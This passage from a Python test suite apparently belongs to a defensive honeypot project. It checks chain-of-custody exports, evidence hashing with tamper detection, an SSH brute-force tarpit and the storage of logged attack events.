        path = export_history(self.evidence_id, fmt="json", out_path=out)
        with open(path) as f:
            data = json.load(f)
        assert data["record_count"] == 2
        assert len(data["records"]) == 2

    def test_export_csv(self, tmp_path):
        from core.chain_of_custody import record_event, export_history
        import csv as csv_mod
        record_event(self.evidence_id, "CREATED")
        out = str(tmp_path / "coc.csv")
        path = export_history(self.evidence_id, fmt="csv", out_path=out)
        with open(path) as f:
            rows = list(csv_mod.DictReader(f))
        assert len(rows) == 1
        assert rows[0]["action"] == "CREATED"

    def test_export_pdf(self, tmp_path):
        from core.chain_of_custody import record_event, export_history
        record_event(self.evidence_id, "CREATED")
        out = str(tmp_path / "coc.pdf")
        path = export_history(self.evidence_id, fmt="pdf", out_path=out)
        with open(path, "rb") as f:
            assert f.read(4) == b"%PDF"

    def test_export_invalid_format_raises(self):
        from core.chain_of_custody import export_history
        with pytest.raises(ValueError, match="Unsupported export format"):
            export_history(self.evidence_id, fmt="xlsx")

    def test_thread_safety_concurrent_inserts(self, tmp_path):
        """Fire 20 concurrent record_event calls from 4 threads —
        confirm all 20 rows land in the DB without corruption.

        Uses a file-based SQLite DB (WAL mode) rather than the
        in-memory StaticPool used by the other tests, because
        StaticPool serialises through a single connection object and
        rejects concurrent commits from multiple threads — this test
        explicitly validates the production connection-per-session
        model, not the shared-connection test harness."""
        import threading
        import database as db
        from sqlalchemy import create_engine, event as sa_event
        from sqlalchemy.orm import sessionmaker

        db_path = str(tmp_path / "thread_test.db")
        engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})

        @sa_event.listens_for(engine, "connect")
        def _wal(conn, _):
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA foreign_keys=ON")

        db.Base.metadata.create_all(engine)

        # Seed an Evidence row in this dedicated DB
        ThreadSession = sessionmaker(bind=engine)
        from database import Evidence
        from datetime import datetime
        with ThreadSession() as s:
            ev = Evidence(
                file_name="thread.bin",
                file_path=str(tmp_path / "thread.bin"),
                sha256_hash="e" * 64,
                hash_created_at=datetime.utcnow(),
                created_at=datetime.utcnow(),
            )
            (tmp_path / "thread.bin").write_bytes(b"t")
            s.add(ev); s.commit()
            tid = ev.id

        # Temporarily point the module at this engine + session factory
        orig_engine, orig_session = db.engine, db.DbSession
        db.engine = engine
        db.DbSession = ThreadSession
        try:
            from core.chain_of_custody import record_event
            from database import ChainOfCustody
            errors = []
            def worker():
                for _ in range(5):
                    try:
                        record_event(tid, "VIEWED", performed_by="t")
                    except Exception as e:
                        errors.append(e)
            threads = [threading.Thread(target=worker) for _ in range(4)]
            for th in threads: th.start()
            for th in threads: th.join()
            assert not errors, f"Thread errors: {errors}"
            with ThreadSession() as s:
                count = s.query(ChainOfCustody).filter(
                    ChainOfCustody.evidence_id == tid).count()
            assert count == 20, f"Expected 20 rows, got {count}"
        finally:
            db.engine    = orig_engine
            db.DbSession = orig_session


class TestEvidenceHashing:
    """Test the Phase 1A Evidence Hashing Framework (core/evidence_hashing.py)."""

    @pytest.fixture(autouse=True)
    def fresh_db_and_tmpfiles(self, tmp_path):
        import database as db
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        from sqlalchemy.orm import sessionmaker
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)
        self.tmp_path = tmp_path
        yield
        db.Base.metadata.drop_all(db.engine)

    def _make_file(self, name: str, content: bytes) -> str:
        path = self.tmp_path / name
        path.write_bytes(content)
        return str(path)

    def test_calculate_hashes_matches_hashlib(self):
        import hashlib
        from core.evidence_hashing import calculate_hashes
        data = b"forensic evidence test content" * 500
        path = self._make_file("evidence1.bin", data)

        result = calculate_hashes(path)
        assert result["error"] is None
        assert result["file_size"] == len(data)
        assert result["sha256"] == hashlib.sha256(data).hexdigest()
        assert result["sha1"] == hashlib.sha1(data, usedforsecurity=False).hexdigest()
        assert result["md5"] == hashlib.md5(data, usedforsecurity=False).hexdigest()

    def test_calculate_hashes_optional_algorithms_can_be_disabled(self):
        from core.evidence_hashing import calculate_hashes
        path = self._make_file("evidence2.bin", b"some data")
        result = calculate_hashes(path, include_md5=False, include_sha1=False)
        assert result["sha256"] is not None
        assert result["sha1"] is None
        assert result["md5"] is None

    def test_calculate_hashes_missing_file_no_exception(self):
        from core.evidence_hashing import calculate_hashes
        result = calculate_hashes(str(self.tmp_path / "does_not_exist.bin"))
        assert result["error"] is not None
        assert result["sha256"] is None

    def test_calculate_hashes_directory_not_a_file(self):
        from core.evidence_hashing import calculate_hashes
        result = calculate_hashes(str(self.tmp_path))
        assert result["error"] is not None

    def test_verify_hash_true_on_match(self):
        from core.evidence_hashing import calculate_hashes, verify_hash
        path = self._make_file("evidence3.bin", b"verify me")
        h = calculate_hashes(path)
        assert verify_hash(path, h["sha256"]) is True

    def test_verify_hash_false_on_mismatch(self):
        from core.evidence_hashing import verify_hash
        path = self._make_file("evidence4.bin", b"some content")
        assert verify_hash(path, "0" * 64) is False

    def test_verify_hash_false_on_missing_file(self):
        from core.evidence_hashing import verify_hash
        assert verify_hash(str(self.tmp_path / "nope.bin"), "0" * 64) is False

    def test_register_evidence_file_creates_db_row(self):
        from database import DbSession, Evidence
        from core.evidence_hashing import register_evidence_file
        path = self._make_file("evidence5.bin", b"register me")

        result = register_evidence_file(path, source_type="manual", source_id="t1")
        assert result is not None
        assert result["hash_verified"] is True

        with DbSession() as s:
            row = s.query(Evidence).filter(Evidence.file_path == path).first()
            assert row is not None
            assert row.sha256_hash == result["sha256_hash"]
            assert row.source_type == "manual"

    def test_save_hash_metadata_detects_tampering(self):
        from database import DbSession, Evidence
        from core.evidence_hashing import register_evidence_file, save_hash_metadata
        path = self._make_file("evidence6.bin", b"original content")

        register_evidence_file(path)
        with DbSession() as s:
            eid = s.query(Evidence).filter(Evidence.file_path == path).first().id

        # Tamper with the file after it was registered
        with open(path, "ab") as f:
            f.write(b"TAMPERED")

        updated = save_hash_metadata(eid)
        assert updated["hash_verified"] is False

    def test_save_hash_metadata_stays_verified_when_unchanged(self):
        from database import DbSession, Evidence
        from core.evidence_hashing import register_evidence_file, save_hash_metadata
        path = self._make_file("evidence7.bin", b"unchanged content")

        register_evidence_file(path)
        with DbSession() as s:
            eid = s.query(Evidence).filter(Evidence.file_path == path).first().id

        updated = save_hash_metadata(eid)
        assert updated["hash_verified"] is True

    def test_verify_evidence_by_id_does_not_overwrite_stored_hash(self):
        from database import DbSession, Evidence
        from core.evidence_hashing import register_evidence_file, verify_evidence_by_id
        path = self._make_file("evidence8.bin", b"original")

        register_evidence_file(path)
        with DbSession() as s:
            row = s.query(Evidence).filter(Evidence.file_path == path).first()
            eid, original_hash = row.id, row.sha256_hash

        with open(path, "ab") as f:
            f.write(b"TAMPERED")

        result = verify_evidence_by_id(eid)
        assert result["hash_verified"] is False

        with DbSession() as s:
            row = s.query(Evidence).filter(Evidence.id == eid).first()
            assert row.sha256_hash == original_hash, \
                "verify_evidence_by_id must not overwrite the stored hash"


class TestTarpit:
    """Test the SSH brute-force tarpit (hardening/tarpit.py)."""

    @pytest.fixture(autouse=True)
    def reset_tarpit_state(self):
        from hardening import tarpit
        tarpit._failure_log.clear()
        yield
        tarpit._failure_log.clear()

    def test_below_threshold_no_tarpit(self):
        from hardening import tarpit
        ip = "198.51.100.10"
        for _ in range(tarpit.MAX_ATTEMPTS - 1):
            tarpit.record_failure(ip)
        assert tarpit.should_tarpit(ip) is False
        assert tarpit.get_delay(ip) == 0.0

    def test_at_threshold_engages_tarpit(self):
        from hardening import tarpit
        ip = "198.51.100.11"
        for _ in range(tarpit.MAX_ATTEMPTS):
            tarpit.record_failure(ip)
        assert tarpit.should_tarpit(ip) is True
        assert tarpit.get_delay(ip) == float(tarpit.TARPIT_DELAY)

    def test_different_ips_tracked_independently(self):
        from hardening import tarpit
        attacker = "198.51.100.12"
        innocent = "198.51.100.13"
        for _ in range(tarpit.MAX_ATTEMPTS):
            tarpit.record_failure(attacker)
        assert tarpit.should_tarpit(attacker) is True
        assert tarpit.should_tarpit(innocent) is False

    def test_reset_clears_tarpit_state(self):
        from hardening import tarpit
        ip = "198.51.100.14"
        for _ in range(tarpit.MAX_ATTEMPTS):
            tarpit.record_failure(ip)
        assert tarpit.should_tarpit(ip) is True
        tarpit.reset(ip)
        assert tarpit.should_tarpit(ip) is False
        assert tarpit.get_delay(ip) == 0.0

    def test_stats_reflects_current_state(self):
        from hardening import tarpit
        ip = "198.51.100.15"
        tarpit.record_failure(ip)
        tarpit.record_failure(ip)
        snapshot = tarpit.stats()
        assert snapshot.get(ip) == 2

    def test_apply_tarpit_delay_actually_blocks(self):
        """Verify apply_tarpit_delay genuinely sleeps for the
        configured duration once the threshold is crossed — not just
        that the bookkeeping functions report the right state."""
        from hardening import tarpit
        import time as time_module
        ip = "198.51.100.16"
        original_delay = tarpit.TARPIT_DELAY
        tarpit.TARPIT_DELAY = 0.2   # shrink for a fast test
        try:
            for _ in range(tarpit.MAX_ATTEMPTS):
                tarpit.record_failure(ip)
            start = time_module.time()
            tarpit.apply_tarpit_delay(ip)
            elapsed = time_module.time() - start
            assert elapsed >= 0.2
        finally:
            tarpit.TARPIT_DELAY = original_delay

    def test_disabled_tarpit_never_engages(self):
        from hardening import tarpit
        ip = "198.51.100.17"
        original_enabled = tarpit.TARPIT_ENABLED
        tarpit.TARPIT_ENABLED = False
        try:
            for _ in range(tarpit.MAX_ATTEMPTS + 5):
                tarpit.record_failure(ip)
            assert tarpit.should_tarpit(ip) is False
            assert tarpit.get_delay(ip) == 0.0
        finally:
            tarpit.TARPIT_ENABLED = original_enabled


class TestEventPipeline:
    """Test that events flow from logger into the database."""

    @pytest.fixture(autouse=True)
    def fresh_db(self, tmp_path):
        import database as db
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        from sqlalchemy.orm import sessionmaker
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)
        yield
        db.Base.metadata.drop_all(db.engine)

    def test_bulk_insert(self):
        from database import bulk_insert_events, DbSession, AttackEvent
        events = [
            {"service": "SSH", "src_ip": f"10.0.0.{i}",
             "event_type": "BRUTE_FORCE", "severity": "HIGH"}
            for i in range(10)
        ]
        bulk_insert_events(events)
        with DbSession() as s:
            assert s.query(AttackEvent).count() == 10

    def test_recent_events_query(self):
        from database import DbSession, AttackEvent, recent_events, bulk_insert_events
        bulk_insert_events([
            {"service": "HTTP", "src_ip": "1.1.1.1",
             "event_type": "SQL_INJECTION", "severity": "CRITICAL"},
        ])
        rows = recent_events(limit=10)
        assert len(rows) == 1
        assert rows[0]["service"] == "HTTP"
